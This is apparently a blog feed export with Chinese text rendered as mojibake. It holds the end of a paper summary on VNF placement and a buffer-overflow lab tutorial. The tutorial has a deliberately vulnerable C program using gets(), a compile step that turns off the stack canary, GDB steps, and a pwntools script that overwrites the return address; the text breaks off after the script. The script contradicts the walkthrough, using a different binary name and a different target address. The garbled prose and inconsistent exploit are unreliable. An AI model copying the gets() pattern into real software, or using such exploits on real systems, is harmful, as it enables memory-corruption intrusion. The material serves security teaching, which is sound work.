æ­¤ï¼Œç•¶éƒ¨ç½²æˆæœ¬æˆç‚ºä¸»å°éƒ¨åˆ†æ™‚ï¼ŒSP é¡¯ç¤ºçš„å„ªå‹¢è¼ƒå°<br>ä¾‹å¦‚ï¼Œç•¶ğ›¾ &#x3D; 10 æ™‚ï¼ŒRLX ç®—æ³•çš„éƒ¨ç½²æˆæœ¬ä½”ç¸½æˆæœ¬çš„æ¯”ä¾‹ç‚º 57%ï¼ŒOPT ç‚º 35%ï¼ŒSP ç‚º 82%ã€‚</p><h3 id="The-effect-of-number-of-hops"><a href="#The-effect-of-number-of-hops" class="headerlink" title="The effect of number of hops"></a>The effect of number of hops</h3><p><img src="https://i.imgur.com/ctY1hjZ.png"><br>æˆ‘å€‘é€šéå°‡è·³æ•¸çš„ä¸Šé™å¾ 2 è®Šç‚º 20 ä¾†ç ”ç©¶ä¸åŒç¶²çµ¡æ‹“æ’²çš„ OPTã€RLX å’Œ SP çš„ç¸½æˆæœ¬<br>å¾åœ– 5 å¯ä»¥çœ‹å‡ºï¼ŒOPT å’Œ RLX çš„æˆæœ¬éš¨è‘—è·³æ•¸çš„å¢åŠ è€Œç•¥æœ‰å¢é•·ï¼Œå› ç‚ºè·³æ•¸çš„å¢åŠ å¯èƒ½æœƒå¢åŠ é€šä¿¡æˆæœ¬ã€‚</p><p>ç„¶è€Œï¼ŒSPå»å‘ˆç¾å‡ºä¸‹é™çš„è¶¨å‹¢ã€‚ä¸»è¦åŸå› æ˜¯ç•¶ä¸åŒæ•¸æ“šä¸­å¿ƒä¹‹é–“çš„è·³æ•¸éƒ½å¾ˆå°æ™‚ï¼ŒSPå¯ä»¥æ‰¾åˆ°å¾ˆå¤šæœ€çŸ­è·¯å¾‘ä¸¦åœ¨é€™äº›è·¯å¾‘ä¸Šéƒ¨ç½²VNFå¯¦ä¾‹ï¼Œè€ŒæŸäº›ç¶²çµ¡åŠŸèƒ½å¯èƒ½æœ‰å¤šå€‹å¯¦ä¾‹ï¼Œå°è‡´éƒ¨ç½²æˆæœ¬è¼ƒé«˜ã€‚<br>ç•¶è·³æ•¸å¢åŠ æ™‚ï¼ŒSP åªæœƒæ‰¾åˆ°æ›´å°‘çš„æœ€çŸ­è·¯å¾‘ï¼Œå¾è€Œå°è‡´ VNF å¯¦ä¾‹æ›´å°‘ï¼Œéƒ¨ç½²æˆæœ¬æ›´ä½ã€‚å› æ­¤ï¼Œç¸½æˆæœ¬é™ä½ã€‚</p><h3 id="The-effect-of-rate"><a href="#The-effect-of-rate" class="headerlink" title="The effect of rate"></a>The effect of rate</h3><p><img src="https://i.imgur.com/KaJ7KXI.png"><br>åŒæ¨£ï¼Œæˆ‘å€‘å°‡ 20 æ¢éˆçš„é€Ÿç‡è¦æ±‚ä¸Šé™å¾ 3 æ›´æ”¹ç‚º 30ï¼Œä»¥é¡¯ç¤ºæµé‡è¦æ±‚çš„å½±éŸ¿ã€‚<br>åœ– 6 é¡¯ç¤ºï¼Œç•¶é€Ÿç‡ä¸Šé™å¢åŠ æ™‚ï¼Œæ‰€æœ‰ä¸‰ç¨®ç®—æ³•çš„ç¸½æˆæœ¬ä¹Ÿæœƒå¢åŠ ã€‚<br>é€™æ˜¯å› ç‚ºå¢åŠ æµé‡æœƒå°è‡´æ›´é«˜çš„é€šä¿¡æˆæœ¬ä»¥åŠç¸½æˆæœ¬ã€‚</p><h3 id="The-effect-of-the-number-of-chains"><a href="#The-effect-of-the-number-of-chains" class="headerlink" title="The effect of the number of chains"></a>The effect of the number of chains</h3><p><img src="https://i.imgur.com/AKitxrs.png"><br>åœ¨é€™ä¸€éƒ¨åˆ†ï¼Œæˆ‘å€‘è¨è«–äº†éˆæ•¸å¾ 5 åˆ° 50 çš„å½±éŸ¿ï¼Œä¸¦æ¯”è¼ƒäº†ä¸‰ç¨®ç®—æ³•çš„çµæœã€‚<br>æ‰€æœ‰ä¸‰ç¨®ç®—æ³•çš„ä¸Šå‡è¶¨å‹¢éƒ½å¯ä»¥åœ¨åœ– 7 ä¸­è§€å¯Ÿåˆ°ã€‚<br>åŸå› æ˜¯æ›´å¤šçš„æœå‹™éˆå¸¶ä¾†äº†æ›´å¤šçš„ç¶²çµ¡åŠŸèƒ½éƒ¨ç½²åœ¨æ•¸æ“šä¸­å¿ƒï¼Œæ›´å¤šçš„ç¶²çµ¡æµåˆ†ä½ˆåˆ° VNF å¯¦ä¾‹ã€‚<br>é€™å°‡å°è‡´æ›´é«˜çš„éƒ¨ç½²æˆæœ¬å’Œé€šä¿¡æˆæœ¬ï¼Œå› æ­¤æ‰€æœ‰ä¸‰ç¨®ç®—æ³•çš„ç¸½æˆæœ¬éƒ½æœƒä¸Šå‡</p><h3 id="The-effect-of-the-number-of-NFs"><a href="#The-effect-of-the-number-of-NFs" class="headerlink" title="The effect of the number of NFs"></a>The effect of the number of NFs</h3><p><img src="https://i.imgur.com/CqLQxDV.png"><br>æœ€å¾Œï¼Œåœ– 8 é¡¯ç¤ºäº†æ‰€æœ‰ä¸‰ç¨®ç®—æ³•çš„çµæœï¼Œç¶²çµ¡åŠŸèƒ½çš„æ•¸é‡å¾ 10 åˆ° 55 ä¸ç­‰<br>å¯ä»¥å¾—å‡ºï¼Œæˆæœ¬ä¹Ÿä¸Šå‡äº†ã€‚é€™æ˜¯å› ç‚ºæ‰€æœ‰ç®—æ³•éƒ½éœ€è¦åœ¨æ•¸æ“šä¸­å¿ƒæ”¾ç½®æ›´å¤šçš„ VNF å¯¦ä¾‹ï¼Œå¾è€Œå°è‡´éƒ¨ç½²æˆæœ¬çš„å¢åŠ ã€‚åŒæ™‚ï¼Œä¸åŒæ•¸æ“šä¸­å¿ƒçš„ç¶²çµ¡åŠŸèƒ½ä¹‹é–“æ›´å¤šçš„ç¶²çµ¡æµé‡ä¹Ÿæœƒå°è‡´é€šä¿¡æˆæœ¬çš„å¢åŠ ã€‚å› æ­¤ï¼Œç¸½æˆæœ¬å‘ˆä¸Šå‡è¶¨å‹¢ã€‚<br>å„˜ç®¡å¦‚æ­¤ï¼Œæˆ‘å€‘çš„RLX çš„å„ªå‹¢å§‹çµ‚å¯ä»¥åœ¨ä»»ä½•è¨­ç½®ä¸‹è§€å¯Ÿåˆ°ï¼Œå› ç‚ºå®ƒå„ªæ–¼SP ä¸¦æ¥è¿‘OPT</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘å€‘ç ”ç©¶äº†åœ°ç†åˆ†ä½ˆå¼æ•¸æ“šä¸­å¿ƒçš„ VNF éƒ¨ç½²å’Œç¶²çµ¡æµé‡èª¿åº¦å•é¡Œã€‚æˆ‘å€‘é€²ä¸€æ­¥å°‡æ­¤å•é¡Œè¡¨è¿°ç‚ºæ··åˆæ•´æ•¸ç·šæ€§è¦åŠƒï¼Œç›®æ¨™æ˜¯æœ€å°åŒ–ç¸½éƒ¨ç½²æˆæœ¬å’Œé€šä¿¡æˆæœ¬ã€‚ç„¶å¾Œæˆ‘å€‘æå‡ºäº†ä¸€ç¨®ä½è¤‡é›œåº¦çš„åŸºæ–¼é¬†å¼›çš„ç®—æ³•ä¾†è™•ç†è¨ˆç®—è¤‡é›œåº¦ã€‚å¤§é‡åŸºæ–¼æ¨¡æ“¬çš„æ€§èƒ½è©•ä¼°çµæœè¡¨æ˜ï¼Œæˆ‘å€‘çš„ç®—æ³•å…·æœ‰æ›´å¥½çš„æ€§èƒ½ï¼Œå¯ä»¥æœ‰æ•ˆé™ä½å„ç¨®å ´æ™¯ä¸‹çš„ç¸½æˆæœ¬</p><h2 id="è³‡æ–™ä¾†æº"><a href="#è³‡æ–™ä¾†æº" class="headerlink" title="è³‡æ–™ä¾†æº"></a>è³‡æ–™ä¾†æº</h2><p><a href="https://ieeexplore.ieee.org/document/8422334">https://ieeexplore.ieee.org/document/8422334</a></p>]]></content>
      
      
      <categories>
          
          <category> è«–æ–‡å°è®€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
            <tag> VNF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯¦é©—ç·©è¡å€æº¢ä½æ¼æ´ (Buffer Overflow)</title>
      <link href="/posts/Buffer_Overflow_Test.html"/>
      <url>/posts/Buffer_Overflow_Test.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><strong>ç·©è¡å€æº¢ä½æ¼æ´ï¼ˆBuffer Overflow)</strong> æ˜¯è»Ÿé«”å’Œç³»çµ±å®‰å…¨é ˜åŸŸä¸­æœ€å¸¸è¦‹ä¸”åš´é‡çš„å®‰å…¨æ¼æ´ä¹‹ä¸€ã€‚ç¾ä»Šæ•¸ä½æ™‚ä»£ä¸­è¤‡é›œçš„è»Ÿé«”ç³»çµ±å¸¸å¸¸é¢è‡¨è‘—ä¾†è‡ªé§­å®¢æˆ–æƒ¡æ„ä½¿ç”¨è€…çš„å¨è„…ã€‚ç·©è¡å€æº¢ä½æ¼æ´ä¾¿æ˜¯é€™äº›å¨è„…ä¸­æœ€ä»¤äººæ“”æ†‚çš„ä¸€ç¨®ï¼Œå› å…¶å°è¨ˆç®—æ©Ÿç³»çµ±é€ æˆçš„å¨è„…ç¨‹åº¦ä¸å¯å¿½è¦–ã€‚</p><p>ç°¡å–®ä¾†èªªï¼Œç·©è¡å€æº¢ä½æ¼æ´æ˜¯æŒ‡ç•¶ç¨‹å¼ç¢¼å˜—è©¦å°‡è³‡æ–™å­˜å„²åœ¨ä¸€å€‹é å…ˆå®šç¾©å¤§å°çš„<strong>è¨˜æ†¶é«”å€å¡Šï¼ˆç¨±ç‚ºç·©è¡å€ï¼‰</strong> ä¸­æ™‚ï¼Œè‹¥è¼¸å…¥çš„è³‡æ–™é‡è¶…éäº†ç·©è¡å€æ‰€èƒ½å®¹ç´çš„æœ€å¤§å€¼ï¼Œå¤šé¤˜çš„è³‡æ–™å°‡æœƒæº¢å‡ºåˆ°ç›¸é„°çš„è¨˜æ†¶é«”å€åŸŸï¼Œå¾è€Œå¯èƒ½è¦†è“‹æ§åˆ¶ç¨‹å¼åŸ·è¡Œçš„æŒ‡ä»¤æˆ–è³‡æ–™ï¼Œé€²è€Œç”¢ç”Ÿæ„æ–™ä¹‹å¤–çš„è¡Œç‚ºã€‚</p><p>é€ æˆç·©è¡å€æº¢ä½æ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯ç¨‹å¼è¨­è¨ˆä¸Šçš„ç–å¿½èˆ‡éŒ¯èª¤ã€‚ç•¶ç¨‹å¼é–‹ç™¼è€…<strong>æœªèƒ½æ­£ç¢ºè™•ç†ä½¿ç”¨è€…è¼¸å…¥çš„æƒ…æ³</strong>ï¼Œç‰¹åˆ¥æ˜¯<strong>æœªèƒ½å°è¼¸å…¥é€²è¡Œå……åˆ†çš„é©—è­‰å’Œé™åˆ¶</strong>ï¼Œå°±å¯èƒ½å¼•ç™¼é€™æ¨£çš„æ¼æ´ã€‚æ”»æ“Šè€…é€šå¸¸æœƒè—‰ç”±å‚³é€ç‰¹è£½çš„æƒ¡æ„è¼¸å…¥æ•¸æ“šï¼Œåˆ©ç”¨é€™äº›æœªç¶“æª¢æŸ¥çš„è¼¸å…¥ï¼Œä½¿ç¨‹å¼é­å—ç·©è¡å€æº¢ä½æ”»æ“Šã€‚é€™ç¨®æ”»æ“Šæ‰‹æ³•å·²ç¶“å­˜åœ¨å¤šå¹´ï¼Œä¸¦ä¸”åœ¨æ­·å²ä¸Šé€ æˆäº†è¨±å¤šåš´é‡çš„å®‰å…¨äº‹ä»¶ã€‚</p><p>éå»ï¼Œè¨±å¤šçŸ¥åçš„ç·©è¡å€æº¢ä½æ¼æ´è¢«å»£æ³›å ±å°ï¼Œå…¶ä¸­ä¸€äº›ç”šè‡³å°å…¨çƒè³‡è¨Šå®‰å…¨ç”¢ç”Ÿäº†æ·±é å½±éŸ¿ã€‚ä¾‹å¦‚ï¼Œè‘—åçš„ <code>Code Red</code> å’Œ <code>Nimda</code> è •èŸ²å°±æ˜¯åˆ©ç”¨ç·©è¡å€æº¢ä½æ¼æ´ä¾†å¿«é€Ÿæ„ŸæŸ“æ•¸ä»¥è¬è¨ˆçš„ä¸»æ©Ÿã€‚åŒæ¨£çš„ï¼Œ<code>Slammer</code> è •èŸ²ä¹Ÿæ˜¯åˆ©ç”¨å¾®è»ŸSQL Serverä¸­çš„ç·©è¡å€æº¢ä½æ¼æ´ï¼Œå°è‡´äº†å…¨çƒäº’è¯ç¶²æµé‡çš„ç¬é–“é£†å‡ã€‚é€™äº›äº‹ä»¶æé†’äº†æ•´å€‹ç§‘æŠ€æ¥­ç•Œå¿…é ˆé«˜åº¦é‡è¦–ç·©è¡å€æº¢ä½æ¼æ´çš„å¨è„…ã€‚</p><blockquote><p>SQL Slammer - <a href="https://en.wikipedia.org/wiki/SQL_Slammer">https://en.wikipedia.org/wiki/SQL_Slammer</a></p></blockquote><p>æ‰€ä»¥é€™ç¯‡æ–‡ç« å°±ä¾†ç°¡å–®çš„å¯¦é©—ä¸€ä¸‹ç·©è¡å€æº¢ä½æ¼æ´ï¼Œè‡³å°‘è®“æˆ‘æœ‰é»æ¦‚å¿µã€‚</p><h2 id="ç’°å¢ƒé…ç½®"><a href="#ç’°å¢ƒé…ç½®" class="headerlink" title="ç’°å¢ƒé…ç½®"></a>ç’°å¢ƒé…ç½®</h2><p>åœ¨ç’°å¢ƒé…ç½®æ–¹é¢ï¼Œæˆ‘å€‘ä½¿ç”¨ <strong>Windows Subsystem for Linux (WSL)</strong> å¹³å°ä¾†é…ç½®é–‹ç™¼ç’°å¢ƒï¼Œä¸¦ä¸”ä½¿ç”¨ <code>Ubuntu 20.04 LTS</code> ä½œç‚ºé–‹ç™¼ç’°å¢ƒã€‚æˆ‘å€‘å°‡åœ¨é€™å€‹ç’°å¢ƒä¸­å®‰è£æ‰€éœ€çš„å·¥å…·ï¼ŒåŒ…æ‹¬ <code>Python3</code>ã€<code>Pwntool</code>ï¼Œä»¥åŠç”¨æ–¼é€²è¡Œ GDB é™¤éŒ¯ çš„ <code>PEDA</code> æ’ä»¶ã€‚</p><p>WSL æä¾›äº†ä¸€å€‹åœ¨ Windows ç³»çµ±ä¸Šé‹è¡Œ Linux ç™¼è¡Œç‰ˆçš„åŠŸèƒ½ï¼Œè®“æˆ‘å€‘èƒ½å¤ åœ¨ Windows ç’°å¢ƒä¸­é€²è¡Œ Linux ç›¸é—œçš„é–‹ç™¼å·¥ä½œã€‚Ubuntu 20.04 LTS æ˜¯ä¸€å€‹ç©©å®šä¸”å¸¸è¦‹çš„ Linux ç™¼è¡Œç‰ˆï¼Œå…¶å»£æ³›æ‡‰ç”¨æ–¼é–‹ç™¼å’Œæ¸¬è©¦ç’°å¢ƒã€‚</p><p>åœ¨é€²è¡Œç’°å¢ƒé…ç½®ä¹‹å‰ï¼Œæˆ‘å€‘éœ€è¦ç¢ºä¿å·²å®‰è£ä¸¦é‹è¡Œäº† WSLã€‚å®‰è£ WSL å¯ä»¥åƒè€ƒå¾®è»Ÿå®˜æ–¹æ–‡æª”æˆ–ç›¸é—œçš„ç·šä¸Šæ•™ç¨‹ã€‚</p><blockquote><p><a href="https://learn.microsoft.com/zh-tw/windows/wsl/install">https://learn.microsoft.com/zh-tw/windows/wsl/install</a></p></blockquote><p>æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘éœ€è¦åœ¨ WSL ä¸­å®‰è£ Python3 å’Œ Pwntoolã€‚Pwntool æ˜¯åœ¨ CTFä¸­å¾ˆå¸¸è¦‹ï¼Œç‰¹åˆ¥é‡å°æ¼æ´åˆ©ç”¨é–‹ç™¼çš„ Python å‡½å¼åº«ã€‚</p><p>åœ¨å®‰è£ Pwntool å‰ï¼Œæˆ‘å€‘éœ€è¦ç¢ºä¿ git å·²ç¶“åœ¨ WSL ä¸­å®‰è£ï¼Œè‹¥æœªå®‰è£å‰‡å¯ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å¯ä»¥é€éä»¥ä¸‹æ–¹æ³•ä¾†å®‰è£ Pwntoolï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3 python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>ç¾åœ¨æˆ‘å€‘å·²ç¶“åœ¨ WSL ä¸­å®Œæˆ Python3 å’Œ Pwntool çš„å®‰è£ã€‚</p><p>æ¥ä¸‹ä¾†ï¼Œæˆ‘å€‘å°‡é…ç½® GDB DEBUGç’°å¢ƒï¼Œä½¿ç”¨ PEDA æ’ä»¶ä¾†å¹«åŠ©æˆ‘å€‘é€²è¡Œç·©è¡å€æº¢ä½æ¼æ´çš„æ¼”ç·´ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>æœ€å¾Œï¼Œé€™è£¡æä¾›äº†ä¸€å€‹ç°¡å–®çš„ C ç¨‹å¼ <code>buffer_test.c</code> ä½œç‚ºæˆ‘å€‘å¯¦éš›æ¼”ç¤ºç·©è¡å€æº¢ä½æ¼æ´çš„ç›®æ¨™ã€‚è©²ç¨‹å¼åŒ…å«äº†ä¸€å€‹ <code>uname()</code> å‡½æ•¸ï¼Œå…¶ä¸­ä½¿ç”¨äº† <code>gets()</code> å‡½æ•¸ä¾†æ¥æ”¶ä½¿ç”¨è€…è¼¸å…¥ï¼Œä½†æ˜¯æœªå°è¼¸å…¥é€²è¡Œè¶³å¤ çš„é©—è­‰ï¼Œå¾è€Œå¯èƒ½å¼•ç™¼ç·©è¡å€æº¢ä½æ¼æ´ã€‚</p><p>buffer_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh No! Your Hacker.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uname</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input your name: \n&quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s \n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);  <span class="comment">//æ¸…é™¤æš«å­˜</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    uname();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>ç¨‹å¼ä¸­å«æœ‰å±éšªè¼¸å…¥å‡½å¼ <strong>gets</strong> ï¼Œä½œç‚º Buffer Overflowçš„ç·´ç¿’ç¨‹å¼</p></div><h2 id="å¯¦é©—æ­¥é©Ÿ"><a href="#å¯¦é©—æ­¥é©Ÿ" class="headerlink" title="å¯¦é©—æ­¥é©Ÿ"></a>å¯¦é©—æ­¥é©Ÿ</h2><h3 id="ä¸€ã€-ç·¨è­¯ç¨‹å¼"><a href="#ä¸€ã€-ç·¨è­¯ç¨‹å¼" class="headerlink" title="ä¸€ã€ ç·¨è­¯ç¨‹å¼"></a>ä¸€ã€ ç·¨è­¯ç¨‹å¼</h3><p>é¦–å…ˆï¼Œæˆ‘å€‘éœ€è¦ç·¨è­¯åç‚º <code>buffer_test.c</code> çš„ç¨‹å¼ç¢¼ï¼Œä»¥ä¾¿é€²è¡Œå¾ŒçºŒçš„å¯¦é©—ã€‚ç·¨è­¯æ™‚æˆ‘å€‘éœ€è¦é—œé–‰ <strong>Stack Canary</strong> çš„é˜²è­·æ©Ÿåˆ¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie</span><br></pre></td></tr></table></figure><div class="note info flat"><p><code>-fno-stack-protector</code> ï¼šé—œé–‰ Stack Canary çš„é˜²è­·æ©Ÿåˆ¶</p></div><h2 id="äºŒã€-æª¢æŸ¥é˜²è­·æªæ–½"><a href="#äºŒã€-æª¢æŸ¥é˜²è­·æªæ–½" class="headerlink" title="äºŒã€ æª¢æŸ¥é˜²è­·æªæ–½"></a>äºŒã€ æª¢æŸ¥é˜²è­·æªæ–½</h2><p>åœ¨å¯¦é©—é–‹å§‹å‰ï¼Œéœ€è¦ç¢ºèªç›®æ¨™ç¨‹å¼çš„å®‰å…¨é˜²è­·æ©Ÿåˆ¶ã€‚å¯ä»¥ç”¨ &#96;checksec æŒ‡ä»¤å¯ä»¥å¿«é€ŸæŸ¥çœ‹ç›®æ¨™åŸ·è¡Œæª”çš„ç›¸é—œå®‰å…¨æªæ–½ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec buffer_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HuO3k3R.png"></p><h2 id="ä¸‰ã€-ç¢ºèªç›®æ¨™ï¼š"><a href="#ä¸‰ã€-ç¢ºèªç›®æ¨™ï¼š" class="headerlink" title="ä¸‰ã€ ç¢ºèªç›®æ¨™ï¼š"></a>ä¸‰ã€ ç¢ºèªç›®æ¨™ï¼š</h2><p>åœ¨é€²è¡Œæ”»æ“Šä¹‹å‰ï¼Œéœ€è¦å…ˆç¢ºèªç›®æ¨™ã€‚åœ¨é€™å€‹å¯¦é©—ä¸­ï¼Œæˆ‘å€‘çš„ç›®æ¨™æ˜¯åŸ·è¡Œ &#96;target å‡½å¼ï¼Œå› æ­¤éœ€è¦æ‰¾åˆ°è©²å‡½å¼çš„è¨˜æ†¶é«”ä½å€ï¼Œä¸¦è“‹éå‡½å¼è¿”å›ä½å€ã€‚</p><h2 id="å››ã€ç¢ºèªå‡½å¼è¨˜æ†¶é«”ä½å€"><a href="#å››ã€ç¢ºèªå‡½å¼è¨˜æ†¶é«”ä½å€" class="headerlink" title="å››ã€ç¢ºèªå‡½å¼è¨˜æ†¶é«”ä½å€"></a>å››ã€ç¢ºèªå‡½å¼è¨˜æ†¶é«”ä½å€</h2><p>é€é GDB ä¾†æŸ¥è©¢ <code>target</code> å‡½å¼çš„è¨˜æ†¶é«”ä½å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb buffer_test</span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disas target</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l1S7BAX.png"></p><p>å¾ä¸Šåœ–å¯å¾—çŸ¥ï¼Œæ­¤functioné–‹å§‹çš„ä½å€åœ¨ <code>0x0000000000401196</code><br>å¾—çŸ¥äº†å‡½å¼ä½å€å¾Œï¼Œæ¥è‘—è¦çŸ¥é“å¦‚ä½•å¾ input è“‹åˆ° ret</p><h2 id="äº”ã€æ¸¬è©¦"><a href="#äº”ã€æ¸¬è©¦" class="headerlink" title="äº”ã€æ¸¬è©¦"></a>äº”ã€æ¸¬è©¦</h2><p>åœ¨å¯¦éš›é€²è¡Œæ”»æ“Šä¹‹å‰ï¼Œæˆ‘å€‘å…ˆåœ¨ GDB ä¸­åŸ·è¡Œç¨‹å¼ï¼Œä¸¦è§€å¯Ÿå®ƒçš„è¡Œç‚ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peta$ </span><span class="language-bash">r    //å…ˆè·‘è·‘çœ‹</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/jdWT4BI.png"></p><p>ç¨‹å¼æœƒè¦æ±‚ä½¿ç”¨è€…è¼¸å…¥åå­—ï¼Œä¸¦åœ¨åå­—è¼¸å…¥å®Œç•¢å¾Œå›æ‡‰ <code>Hello, &#123;name&#125;</code>ã€‚ç”±æ–¼åŸç¨‹å¼ä¸­å®¹ç´ä½¿ç”¨è€…è¼¸å…¥çš„é™£åˆ—åªæœ‰ 16 å€‹ä½å…ƒçµ„ï¼ˆ<code>RBP ~ RBP-16</code>ï¼‰ï¼Œ<strong>æ‰€ä»¥æˆ‘å€‘å¯ä»¥é€éè¼¸å…¥è¶…é 16 å€‹ä½å…ƒçµ„çš„è³‡æ–™ä¾†è§€å¯Ÿå®ƒçš„è¡Œç‚ºã€‚</strong></p><p><img src="https://i.imgur.com/HOnCJiX.png" alt="Imgur"></p><p>å¦‚åœ–æ‰€ç¤ºï¼Œç•¶è¼¸å…¥è¶…é 24 å€‹ä½å…ƒçµ„æ™‚ï¼Œç¨‹å¼å°±æœƒç™¼ç”Ÿç·©è¡å€æº¢ä½ï¼Œä¸¦ä¸”åœ¨å­—å…ƒ v å¾Œå°±ç™¼ç”Ÿå´©æ½°ã€‚é€™è¡¨ç¤ºæˆ‘å€‘éœ€è¦è‡³å°‘ 24 å€‹ä½å…ƒçµ„çš„è¼¸å…¥ï¼Œæ‰èƒ½æˆåŠŸè“‹éå‡½å¼è¿”å›ä½å€ã€‚</p><blockquote><p>æ‰€ä»¥å† <code>8Bytes</code> å³å¯è“‹å®Œ ret address</p></blockquote><blockquote><p>RBP é‚£é¡¯ç¤ºåªåˆ° qrstuvwxï¼Œæ„æ€å°±æ˜¯è¼¸åˆ°24byteå°±çˆ†äº†</p></blockquote><h2 id="å…­ã€å¯¦éš›ç”¨-Python-ä¾†è¦†è“‹"><a href="#å…­ã€å¯¦éš›ç”¨-Python-ä¾†è¦†è“‹" class="headerlink" title="å…­ã€å¯¦éš›ç”¨ Python ä¾†è¦†è“‹"></a>å…­ã€å¯¦éš›ç”¨ Python ä¾†è¦†è“‹</h2><p>ç‚ºäº†é€²è¡Œå¯¦éš›çš„æ”»æ“Šï¼Œå°‡ä½¿ç”¨ Python æ’°å¯«æ”»æ“Šè…³æœ¬ã€‚é€™å€‹è…³æœ¬å°‡ä½¿ç”¨ <code>Pwntools</code> å‡½å¼åº«ä¾†é€²è¡Œæ”»æ“Šï¼Œè“‹éç¨‹å¼ä¸­çš„å‡½å¼è¿”å›ä½å€ï¼Œä½¿ä¹‹åŸ·è¡Œ <code>target</code> å‡½å¼ã€‚</p><p>æ”»æ“Šè…³æœ¬ attack.py å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./demo&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;input your name:&#x27;</span>) </span><br><span class="line">targer_address = p64(<span class="number">0x400667</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + targer_address)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>åœ¨æ”»æ“Šè…³æœ¬ä¸­ï¼Œæˆ‘å€‘ä½¿ç”¨ <code>process()</code> å‡½å¼ä¾†åŸ·è¡Œ buffer_test ç¨‹å¼ã€‚æ¥è‘—ï¼Œé€é <code>recvuntil()</code> å‡½å¼ç­‰å¾…ç¨‹å¼é¡¯ç¤º <strong>â€œinput your name:â€</strong> çš„æç¤ºï¼Œç„¶å¾Œå°‡æˆ‘å€‘äº‹å…ˆè¨ˆç®—å¥½çš„ <code>target</code> å‡½å¼ä½å€åŠ å…¥åˆ°è¼¸å…¥è³‡æ–™ä¸­ã€‚æœ€å¾Œï¼Œä½¿ç”¨ <code>interactive()</code> 